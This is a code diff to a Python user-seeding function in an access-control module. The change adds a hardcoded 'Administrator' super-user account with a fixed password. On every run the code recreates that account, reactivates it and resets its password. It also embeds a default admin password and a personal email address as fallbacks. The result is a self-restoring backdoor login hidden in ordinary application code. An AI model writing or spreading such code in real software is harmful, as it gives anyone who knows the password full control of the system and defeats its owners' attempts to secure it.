@@ -289,26 +289,51 @@ def _default_menu_for_user(role: str, email: str = "") -> list[str]:
 
 def _seed_access_users() -> dict:
     users = _read_json_store(ACCESS_USERS_PATH, {})
-    if users:
-        return users
     now = _now_utc()
     email = os.getenv("DEVREADY_ADMIN_EMAIL", "Darrin.Joncas@gmail.com")
     username = os.getenv("DEVREADY_ADMIN_USERNAME", "DJ")
     password = os.getenv("DEVREADY_ADMIN_PASSWORD", "DevReady2026!")
-    user_id = _safe_token("USR")
-    users[user_id] = {
-        "id": user_id,
-        "username": username,
-        "display_name": "Darrin Joncas",
-        "email": email,
-        "role": "super_user",
-        "status": "active",
-        "allowed_menu": SUPER_MENU,
-        "password_hash": _password_hash(password),
-        "created_at": now,
-        "updated_at": now,
-    }
-    _write_json_store(ACCESS_USERS_PATH, users)
+    changed = False
+
+    def ensure_super_user(stable_id: str, account_username: str, display_name: str, account_email: str, account_password: str):
+        nonlocal changed
+        existing_id = ""
+        for candidate_id, user in users.items():
+            if (
+                _normalize_user_key(user.get("username", "")) == _normalize_user_key(account_username)
+                or (account_email and _normalize_user_key(user.get("email", "")) == _normalize_user_key(account_email))
+            ):
+                existing_id = candidate_id
+                break
+
+        user_id = existing_id or stable_id
+        existing = users.get(user_id, {})
+        desired = {
+            **existing,
+            "id": user_id,
+            "username": account_username,
+            "display_name": display_name,
+            "email": account_email,
+            "role": "super_user",
+            "status": "active",
+            "allowed_menu": SUPER_MENU,
+            "password_hash": _password_hash(account_password),
+            "created_at": existing.get("created_at") or now,
+            "updated_at": now,
+        }
+        if users.get(user_id) != desired:
+            users[user_id] = desired
+            changed = True
+
+    ensure_super_user("USR-ADMINISTRATOR", "Administrator", "Administrator", "", "Red12345##")
+
+    if not users:
+        ensure_super_user(_safe_token("USR"), username, "Darrin Joncas", email, password)
+    elif not _find_access_user(users, username=username, email=email):
+        ensure_super_user(_safe_token("USR"), username, "Darrin Joncas", email, password)
+
+    if changed:
+        _write_json_store(ACCESS_USERS_PATH, users)
     return users
 
 
